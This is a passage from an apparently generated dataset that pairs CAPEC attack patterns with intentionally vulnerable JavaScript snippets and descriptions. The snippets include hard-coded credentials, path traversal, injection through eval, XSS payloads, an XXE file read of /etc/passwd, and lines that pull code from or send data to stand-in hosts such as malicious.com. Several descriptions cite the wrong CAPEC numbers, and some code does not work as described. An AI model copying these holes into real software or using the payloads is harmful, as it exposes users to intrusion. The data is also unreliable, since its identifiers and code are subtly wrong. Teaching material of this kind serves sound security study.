        "code_snippet": "const SECRET_KEY = 'hardcoded_secret_key';\n\nfunction authenticate(user, password) {\n    const hardcodedUser = 'admin';\n    const hardcodedPassword = 'password123';\n    if (user === hardcodedUser && password === hardcodedPassword) {\n        return 'Authentication successful';\n    } else {\n        return 'Authentication failed';\n    }\n}\n\nconsole.log(authenticate('admin', 'password123'));",
        "description": "This JavaScript code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive information such as a secret key and credentials directly within the code. The `SECRET_KEY` variable and the hardcoded credentials within the `authenticate` function are examples of CWE-798 (Use of Hard-coded Credentials) and CWE-547 (Use of Hard-coded, Security-relevant Constants). This code is vulnerable because an adversary can easily extract these hard-coded values through static or dynamic analysis, leading to potential security breaches. The code also exemplifies CWE-318 (Cleartext Storage of Sensitive Information in Executable) as the sensitive information is stored in cleartext within the executable."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('username=admin&password=admin123');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a basic TCP client using the 'net' module to connect to a server. The client sends sensitive information (username and password) in cleartext, which can be intercepted by an adversary. This embodies the main idea of CAPEC-272 (Protocol Analysis) by showing how an attacker could analyze and intercept protocol information. The code also highlights CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting sensitive data without encryption, making it vulnerable to sniffing attacks."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No file specified');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on a 'file' query parameter from the URL. The server does not sanitize or validate the 'file' parameter, allowing an attacker to specify any file path, potentially leading to remote file inclusion vulnerabilities. This embodies the main idea of the CAPEC by demonstrating how improper control of file paths can lead to arbitrary code execution. The related CWEs are represented by the lack of input validation (CWE-98), potential for XSS if the file contains malicious scripts (CWE-80), reliance on file names (CWE-646), and the risk of serving raw web content (CWE-433)."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // Improper Authentication: No verification of the source\n  const user = req.headers['x-user'];\n  if (user) {\n    // Authentication Bypass by Spoofing: Trusting the user header without verification\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`Hello, ${user}!`);\n  } else {\n    res.writeHead(401, {'Content-Type': 'text/plain'});\n    res.end('Unauthorized');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that improperly authenticates users based on a custom 'x-user' header. The server does not verify the authenticity of the 'x-user' header, allowing an attacker to spoof the identity by simply setting this header in their request. This embodies the main idea of the CAPEC 'Fake the Source of Data' by demonstrating how improper authentication (CWE-287) and authentication bypass by spoofing (CWE-290) can lead to unauthorized access. The code also highlights the lack of proper verification of the source of a communication channel (CWE-940) and the potential for message integrity issues (CWE-924)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Middleware to simulate weak authentication\napp.use((req, res, next) => {\n  const user = req.headers['x-user'];\n  if (!user) {\n    return res.status(401).send('Authentication required');\n  }\n  req.user = user;\n  next();\n});\n\n// Endpoint that can be spoofed\napp.get('/data', (req, res) => {\n  // Simulate a reflection attack vulnerability\n  if (req.query.user === req.user) {\n    return res.send(`Sensitive data for user: ${req.user}`);\n  }\n  res.status(403).send('Forbidden');\n});\n\napp.listen(port, () => {\n  console.log(`Server running on http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a weak authentication mechanism that can be exploited for a Principal Spoof attack. The middleware checks for a user identity in the request headers but does not verify its authenticity, embodying CWE-1390 (Weak Authentication). The '/data' endpoint simulates a reflection attack vulnerability (CWE-301) by checking if the query parameter 'user' matches the user identity from the headers, without proper verification. This setup allows an adversary to spoof the identity of another user by crafting requests with arbitrary 'x-user' headers, demonstrating the concept of a Principal Spoof attack."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak session token generation\nfunction generateSessionToken(userId) {\n  const weakSecret = '12345'; // CWE-1391: Use of Weak Credentials\n  const token = crypto.createHmac('sha256', weakSecret)\n                      .update(userId + Date.now().toString())\n                      .digest('hex');\n  return token;\n}\n\n// Simulate session fixation vulnerability\nfunction authenticateUser(userId, sessionToken) {\n  // CWE-384: Session Fixation\n  if (sessionToken) {\n    console.log('Session token reused:', sessionToken);\n  } else {\n    const newToken = generateSessionToken(userId);\n    console.log('New session token generated:', newToken);\n  }\n}\n\n// Example usage\nconst userId = 'user123';\nconst forgedToken = generateSessionToken(userId); // Attacker forges a token\nauthenticateUser(userId, forgedToken); // Attacker uses the forged token",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can forge a session token to gain unauthorized access to a service. The `generateSessionToken` function creates a session token using a weak secret (CWE-1391: Use of Weak Credentials), making it easier for an attacker to guess or forge a valid token. The `authenticateUser` function simulates a session fixation vulnerability (CWE-384: Session Fixation) by allowing the reuse of an existing session token without invalidating it. In the example usage, an attacker forges a session token and uses it to authenticate as a legitimate user, embodying the main idea of CAPEC-61: Session Credential Falsification through Forging."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "function expandData(data, depth) {\n  if (depth > 10) return data;\n  let expandedData = '';\n  for (let i = 0; i < 10; i++) {\n    expandedData += expandData(data, depth + 1);\n  }\n  return expandedData;\n}\n\nlet inputData = 'A';\nlet result = expandData(inputData, 0);\nconsole.log(result.length);",
        "description": "This JavaScript code snippet demonstrates an exponential data expansion vulnerability. The `expandData` function recursively expands the input data by concatenating it multiple times, leading to exponential growth in memory usage. The `depth` parameter controls the recursion depth, and the function stops recursion if the depth exceeds 10. However, even with a depth limit, the function can still cause significant memory and CPU usage due to the exponential nature of the expansion. This snippet embodies the main idea of CAPEC-230 (Exponential Data Expansion) and highlights related weaknesses such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-776 (Improper Restriction of Recursive Entity References in DTDs)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Error Page</title>\n</head>\n<body>\n    <h1>Error</h1>\n    <p id=\"errorMessage\"></p>\n    <script>\n        // Simulate receiving a malformed request with exploit code\n        var userInput = decodeURIComponent(window.location.search.substring(1));\n        // Directly inserting user input into the error message without proper sanitization\n        document.getElementById('errorMessage').innerHTML = 'An error occurred: ' + userInput;\n    </script>\n</body>\n</html>",
        "description": "This code snippet represents a vulnerable error page that directly inserts user input into the HTML without proper sanitization. The 'userInput' variable simulates receiving a malformed request containing exploit code. The error message is then constructed by concatenating a static string with the user input and inserting it into the DOM using 'innerHTML'. This approach fails to neutralize special characters, making the page susceptible to XSS attacks. An attacker could craft a URL with malicious script code, which would be executed when the error page is displayed, exemplifying the 'XSS Targeting Error Pages' CAPEC and related CWEs."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "const userInput = '<ScRiPt>alert(\"XSS Attack!\")</ScRiPt>';\nconst sanitizedInput = userInput.replace(/<script>/gi, '');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to XSS attacks using alternate syntax. The `userInput` variable contains a script tag with mixed case letters to bypass a simplistic filter. The `sanitizedInput` variable attempts to sanitize the input by removing occurrences of the `<script>` tag using a case-insensitive regular expression. However, the filter only targets the exact `<script>` tag and fails to account for alternate forms like `<ScRiPt>`. As a result, the malicious script is not removed and gets executed when inserted into the DOM via `document.body.innerHTML`. This example highlights the risk of using incomplete denylist-based protection mechanisms (CWE-692) and improper neutralization of alternate XSS syntax (CWE-87)."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "function processInput(input) {\n  // Input filter removed\n  // var filteredInput = input.replace(/[^a-zA-Z0-9]/g, '');\n  var filteredInput = input; // No filtering applied\n  eval('console.log(' + filteredInput + ')'); // Vulnerable to injection\n}\n\n// Example usage\nprocessInput('alert(\"XSS\")');",
        "description": "This JavaScript code snippet demonstrates the removal of input filters, which is the main idea of the CAPEC. The function `processInput` is supposed to filter the input to remove any non-alphanumeric characters, but the filtering mechanism is commented out, leaving the input unfiltered. The unfiltered input is then passed to the `eval` function, which is vulnerable to injection attacks (CWE-74). This can lead to the execution of arbitrary code, as shown in the example usage where an alert box is triggered. This snippet also touches on CWE-20 (Improper Input Validation) and CWE-707 (Improper Neutralization) by not validating or neutralizing the input properly."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "const fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst xmlData = `\n<root>\n  <externalEntity SYSTEM \"file:///etc/passwd\" />\n  <data>&externalEntity;</data>\n</root>`;\n\nxml2js.parseString(xmlData, { xmlMode: true }, (err, result) => {\n  if (err) throw err;\n  console.log(result);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). It uses the 'xml2js' library to parse an XML string that includes an external entity reference. The XML data contains a SYSTEM entity that references a local file ('/etc/passwd'). When the XML is parsed, the external entity is resolved, potentially exposing sensitive information from the file system. This example highlights CWE-611 (Improper Restriction of XML External Entity Reference) by showing how an external entity can be used to access unintended files. The code does not validate or restrict the external entity, making it vulnerable to attacks that exploit this weakness."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1234, '127.0.0.1', () => {\n  console.log('Connected to server');\n  // Bypassing client-side authentication\n  client.write(JSON.stringify({ action: 'authenticate', token: 'invalid_token' }));\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Injecting malicious code\n  if (data.toString().includes('authenticated')) {\n    client.write(JSON.stringify({ action: 'execute', command: 'malicious_command' }));\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a malicious client application that connects to a server and attempts to bypass client-side authentication by sending an invalid token. If the server responds with an 'authenticated' message, the client then sends a command to execute malicious code. This embodies the CAPEC 'Create Malicious Client' by violating the server's assumptions about client behavior. The code also touches on related CWEs: CWE-603 (Use of Client-Side Authentication) by bypassing authentication, CWE-506 (Embedded Malicious Code) by injecting a malicious command, and CWE-507 (Trojan Horse) by appearing to perform legitimate actions while hiding malicious intent."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "const { exec } = require('child_process');\n\n// Vulnerable function to modify Windows Registry\nfunction modifyRegistry(key, value) {\n  const command = `reg add ${key} /v ${value.name} /t REG_SZ /d ${value.data} /f`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nmodifyRegistry('HKCU\\Software\\ExampleApp', { name: 'Config', data: 'malicious_data' });",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that modifies the Windows Registry using the 'reg' command. The function 'modifyRegistry' takes a registry key and a value object as parameters and constructs a command to add or update a registry entry. The 'exec' function from the 'child_process' module is used to execute the command. This code embodies the CAPEC idea of manipulating registry information, potentially allowing an adversary to hide configuration information or remove indicators of compromise. The related CWEs are represented by the external control of system settings (CWE-15) and the potential for storing sensitive information in cleartext (CWE-314)."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "function fetchSensitiveData() {\n    fetch('https://example.com/api/sensitive-data')\n        .then(response => response.json())\n        .then(data => {\n            // Store sensitive data in local storage (cache)\n            localStorage.setItem('sensitiveData', JSON.stringify(data));\n            console.log('Sensitive data cached');\n        })\n        .catch(error => console.error('Error fetching sensitive data:', error));\n}\n\nfetchSensitiveData();",
        "description": "This JavaScript code snippet demonstrates a common vulnerability where sensitive data is fetched from a remote server and stored in the browser's local storage (cache) without any encryption. The function `fetchSensitiveData` makes an HTTP request to retrieve sensitive information from an API endpoint. Upon receiving the data, it stores the sensitive information in the browser's local storage using `localStorage.setItem`. This practice can lead to the exposure of sensitive information if an attacker gains access to the browser's local storage. This example embodies the main idea of CAPEC- Lifting Sensitive Data Embedded in Cache, and highlights related CWEs such as CWE-524 (Use of Cache Containing Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data)."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "const credentials = { username: 'admin', password: 'password123' }; \n\nfunction authenticate(user, pass) { \n  if (user === credentials.username && pass === credentials.password) { \n    console.log('Authentication successful'); \n  } else { \n    console.log('Authentication failed'); \n  } \n} \n\n// Simulating client-side authentication \nauthenticate('admin', 'password123');",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication. The credentials are hardcoded within the client-side code, which is a direct representation of CAPEC-37: Retrieve Embedded Sensitive Data. This approach is insecure because an attacker can easily extract these credentials from the client-side code. Additionally, the authentication logic is performed on the client side, which can be bypassed by modifying the client code, aligning with CWE-603: Use of Client-Side Authentication. This snippet highlights the risks of embedding sensitive data in client distributions and performing authentication on the client side."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// CWE-798: Use of Hard-coded Credentials\nconst privateKey = `-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...\n-----END PRIVATE KEY-----`;\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nfs.chmodSync('/path/to/private/key', 0o777); // Insecure permission\n\n// CWE-494: Download of Code Without Integrity Check\nconst maliciousCode = fs.readFileSync('http://malicious.com/malicious.js', 'utf8');\n\n// Sign the malicious code\nconst sign = crypto.createSign('SHA256');\nsign.update(maliciousCode);\nsign.end();\nconst signature = sign.sign(privateKey, 'hex');\n\n// CWE-506: Embedded Malicious Code\nconst signedMaliciousCode = `/* Signed Malicious Code */\n${maliciousCode}\n/* Signature: ${signature} */`;\n\n// Save the signed malicious code\nfs.writeFileSync('/path/to/output/signedMaliciousCode.js', signedMaliciousCode);\n\nconsole.log('Malicious code signed and saved.');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Signing Malicious Code' (CAPEC). It uses hard-coded credentials (CWE-798) to sign a piece of malicious code. The private key is stored with insecure permissions (CWE-732), allowing unintended actors to access it. The code downloads a malicious script without verifying its integrity (CWE-494) and then signs it using the hard-coded private key. The signed malicious code is saved to a file, embedding the malicious content (CWE-506). This example highlights the risks associated with improper handling of signing credentials and the potential for adversaries to sign and distribute malicious code as if it were legitimate."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side authentication (CWE-603)\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n}\n\nfunction accessProtectedResource() {\n  // Client-side enforcement of server-side security (CWE-602)\n  if (authenticateUser(prompt('Username:'), prompt('Password:'))) {\n    alert('Access granted to protected resource');\n  } else {\n    alert('Access denied');\n  }\n}\n\n// Simulating the removal of client-side functionality (CAPEC-160)\n// An attacker can bypass the authentication by modifying the client code\naccessProtectedResource();",
        "description": "This JavaScript code snippet demonstrates a scenario where client-side authentication and security enforcement are implemented, which is inherently vulnerable. The `authenticateUser` function performs authentication on the client side (CWE-603), and the `accessProtectedResource` function relies on this client-side authentication to grant access to a protected resource (CWE-602). An attacker can easily bypass this security mechanism by modifying the client code, such as removing or altering the `authenticateUser` function, thereby gaining unauthorized access to the protected resource. This embodies the main idea of CAPEC-160, where important client functionality assumed to be present and trustworthy by the server is removed or disabled, leading to security vulnerabilities."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "function calculateTotalCost(price, quantity) {\n  // Client-side calculation of total cost\n  return price * quantity;\n}\n\n// Example usage\nlet price = 100; // Price per item\nlet quantity = 5; // Number of items\n\n// Attacker modifies the quantity to exploit the vulnerability\nquantity = 1; // Incorrect quantity set by attacker\n\nlet totalCost = calculateTotalCost(price, quantity);\n\n// Send the manipulated total cost to the server\nsendToServer(totalCost);\n\nfunction sendToServer(totalCost) {\n  // Simulate sending data to the server\n  console.log('Total cost sent to server:', totalCost);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-side calculation of the total cost of items. The function `calculateTotalCost` takes the price per item and the quantity of items as input and returns the total cost. An attacker can manipulate the quantity variable to a lower value before the total cost is calculated and sent to the server, resulting in an incorrect total cost being sent. This embodies the CAPEC's main idea of removing or modifying client-side logic to send incorrect information to the server. The related CWEs are represented by the reliance on client-side enforcement (CWE-602), incorrect calculation (CWE-682), and improper validation of input (CWE-1284)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "<html>\n<head>\n    <title>Test Page</title>\n</head>\n<body>\n    <h1>Welcome to the Test Page</h1>\n    <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA\n    AAAFCAYAAACNbyblAAAAHElEQVQI12P4\n    //8/w38GIAXDIBKE0DHxgljNBAAO\n    9TXL0Y4OHwAAAABJRU5ErkJggg==\" onerror=\"alert('XSS')\">\n</body>\n</html>",
        "description": "This HTML snippet demonstrates a Cross-Site Scripting (XSS) attack using MIME type mismatch. The image tag's 'src' attribute is set to a base64-encoded PNG image, but the 'onerror' attribute contains a JavaScript alert function. If the browser misinterprets the MIME type and executes the script, it will trigger an alert box. This example highlights the vulnerability described in CAPEC-147, where an adversary can exploit MIME type mismatches to execute arbitrary scripts. The related CWEs are represented by the improper neutralization of input (CWE-79), reliance on file name or extension (CWE-646), and improper neutralization of script in attributes of IMG tags (CWE-82)."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "document.getElementById('submitButton').addEventListener('click', function() {\n  var userInput = document.getElementById('userInput').value;\n  var imgTag = '<img src=\"x\" onerror=\"alert(\\'XSS\\')\">';\n  document.getElementById('output').innerHTML = userInput + imgTag;\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to the deprecated CAPEC pattern of leveraging web tools to change application behavior. The code listens for a click event on a button with the ID 'submitButton'. When clicked, it retrieves user input from an element with the ID 'userInput' and appends an IMG tag with an 'onerror' attribute that triggers an alert (simulating an XSS attack) to an element with the ID 'output'. This snippet embodies CWE-79 (Improper Neutralization of Input During Web Page Generation) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) by not properly sanitizing user input and allowing script execution within an IMG tag."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "function getSensitiveData() {\n  // Undocumented feature: access to sensitive data\n  return process.env.SENSITIVE_DATA;\n}\n\nfunction misuseFunctionality() {\n  // Misuse of legitimate functionality to access sensitive data\n  let data = getSensitiveData();\n  console.log('Sensitive Data:', data);\n}\n\nmisuseFunctionality();",
        "description": "This JavaScript code snippet demonstrates a functionality misuse vulnerability. The `getSensitiveData` function leverages an undocumented feature (CWE-1242) to access sensitive data stored in environment variables. The `misuseFunctionality` function then calls `getSensitiveData` and logs the sensitive data to the console, exposing it to unauthorized users (CWE-497). This misuse of legitimate functionality (CAPEC) can lead to unauthorized access to sensitive information, representing the core idea of the CAPEC description."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'public');\n  let filePath = path.join(basePath, req.url);\n\n  // Vulnerable to path traversal\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. However, the code is vulnerable to path traversal attacks because it directly concatenates the user-provided URL to the base directory path without proper validation or sanitization. An attacker could exploit this vulnerability by crafting a URL with sequences like '/../' or '.../...//' to access files outside the intended directory, potentially leading to unauthorized access to sensitive files on the server."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  try {\n    // Simulate a potential error\n    if (req.url === '/error') {\n      throw new Error('Simulated error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello, world!');\n  } catch (err) {\n    // Exposing stack trace in the response (vulnerable practice)\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Error: ${err.message}\\nStack Trace: ${err.stack}`);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server listens for incoming requests and responds with 'Hello, world!' for normal requests. However, if the request URL is '/error', it simulates an error and catches it in a try-catch block. The catch block then exposes the error message and stack trace directly in the HTTP response, which is a vulnerable practice. This represents the main idea of the deprecated CAPEC pattern, which involves using fuzzing to trigger errors and expose stack traces for application mapping. The code also touches on related CWEs, such as missing custom error pages (CWE-7) and information exposure through debug log files (CWE-534), by demonstrating how sensitive information can be inadvertently exposed to the user."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  try {\n    // Simulate processing of request\n    if (Math.random() < 0.5) {\n      throw new Error('Random processing error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Request processed successfully');\n  } catch (err) {\n    // Log error with sensitive information\n    console.error(`Error: ${err.message}, Stack: ${err.stack}`);\n    // Send error response with sensitive information\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(`Internal Server Error: ${err.message}`);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming requests. It simulates random errors during request processing. When an error occurs, it logs the error message and stack trace, which may contain sensitive information, to the console. Additionally, it sends an error response to the client that includes the error message. This embodies the main idea of CAPEC-013, 'Fuzzing for application mapping,' by potentially exposing sensitive information through error messages and logs, as described in the related CWEs (CWE-209, CWE-532, CWE-211, CWE-497, CWE-210)."
    },
    {
        "capec_id": "216",
        "capec_name": "Communication Channel Manipulation",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Missing authentication for critical function (CWE-306)\n    console.log('Received data:', data.toString());\n    // Improper enforcement of message integrity (CWE-924)\n    // No integrity check on the received data\n    // Improper verification of source (CWE-940)\n    // No verification of the source of the data\n  });\n\n  socket.on('end', () => {\n    console.log('Connection ended');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections on port 8080. When data is received, it is logged to the console without any authentication (CWE-306), integrity checks (CWE-924), or source verification (CWE-940). This demonstrates the concept of 'Communication Channel Manipulation' (CAPEC) by showing how an adversary could manipulate the communication channel due to the lack of proper security measures. The code is vulnerable to various attacks, including information exposure and unauthorized data manipulation."
    },
    {
        "capec_id": "217",
        "capec_name": "Exploiting Incorrectly Configured SSL/TLS",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'example.com',\n  port: 443,\n  path: '/data',\n  method: 'GET',\n  rejectUnauthorized: false // CWE-294: Improper SSL/TLS configuration\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    console.log('Received data:', data); // CWE-201: Insertion of Sensitive Information Into Sent Data\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates an HTTPS request with an insecure SSL/TLS configuration. The 'rejectUnauthorized' option is set to false, which means the client does not verify the server's SSL/TLS certificate, making it vulnerable to man-in-the-middle attacks (CWE-294). Additionally, the code logs the received data directly to the console, which could include sensitive information (CWE-201). This snippet embodies the main idea of CAPEC-640 by showing how an adversary could exploit incorrectly configured SSL/TLS communications to access or manipulate data."
    },
    {
        "capec_id": "218",
        "capec_name": "Spoofing of UDDI/ebXML Messages",
        "code_snippet": "const xml2js = require('xml2js');\nconst axios = require('axios');\n\nasync function sendRequest(xmlMessage) {\n  try {\n    // Missing XML Validation (CWE-112)\n    const parser = new xml2js.Parser();\n    const parsedMessage = await parser.parseStringPromise(xmlMessage);\n\n    // Incorrectly Specified Destination (CWE-941)\n    const destinationUrl = parsedMessage.destinationUrl[0];\n\n    // Sending the message without verifying the destination or message integrity (CWE-345, CWE-924)\n    const response = await axios.post(destinationUrl, xmlMessage, {\n      headers: { 'Content-Type': 'application/xml' }\n    });\n\n    console.log('Response:', response.data);\n  } catch (error) {\n    console.error('Error:', error);\n  }\n}\n\n// Example of a spoofed UDDI/ebXML message\nconst spoofedMessage = `\n<message>\n  <destinationUrl>http://malicious-actor.com</destinationUrl>\n  <data>Important transaction data</data>\n</message>`;\n\nsendRequest(spoofedMessage);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a UDDI/ebXML message to impersonate a service provider in an e-business transaction. The code lacks proper XML validation (CWE-112), does not verify the authenticity of the data (CWE-345), and does not ensure message integrity during transmission (CWE-924). Additionally, it incorrectly specifies the destination URL (CWE-941), allowing an attacker to redirect the message to a malicious endpoint. This can lead to sensitive information disclosure, loss of message integrity, or financial fraud."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => { body += chunk; });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, { 'Content-Type': 'text/plain' });\n        res.end('Invalid XML');\n        return;\n      }\n\n      // CWE-112: Missing XML Validation\n      // CWE-611: Improper Restriction of XML External Entity Reference\n      // CWE-643: Improper Neutralization of Data within XPath Expressions\n      const xpath = require('xpath'), dom = require('xmldom').DOMParser;\n      const doc = new dom().parseFromString(body);\n      const nodes = xpath.select(\"//user[name/text()='admin']/password/text()\", doc);\n\n      // CWE-441: Unintended Proxy or Intermediary\n      // CWE-610: Externally Controlled Reference to a Resource in Another Sphere\n      const targetUrl = result.targetUrl[0];\n      const options = { hostname: targetUrl, port: 80, path: '/', method: 'POST', headers: { 'Content-Type': 'application/xml' } };\n      const proxyReq = http.request(options, proxyRes => {\n        let proxyBody = '';\n        proxyRes.on('data', chunk => { proxyBody += chunk; });\n        proxyRes.on('end', () => {\n          res.writeHead(200, { 'Content-Type': 'application/xml' });\n          res.end(proxyBody);\n        });\n      });\n      proxyReq.write(body);\n      proxyReq.end();\n    });\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming XML requests. It demonstrates several vulnerabilities related to XML Routing Detour Attacks and associated CWEs. The server parses incoming XML without validation (CWE-112), potentially allowing XML External Entity (XXE) attacks (CWE-611). It uses XPath expressions without proper neutralization (CWE-643), making it susceptible to XPath Injection. The server also acts as an unintended proxy (CWE-441) by forwarding the XML content to an external URL specified within the XML (CWE-610), which could be controlled by an attacker. This setup allows an attacker to reroute and manipulate XML processing, embodying the main idea of XML Routing Detour Attacks (CAPEC-94)."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // Weak algorithm selection\n    client.write('AUTH PLAIN weakpassword');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Replay attack vulnerability\n    if (data.toString().includes('AUTH_SUCCESS')) {\n        client.write('REPLAY AUTH PLAIN weakpassword');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
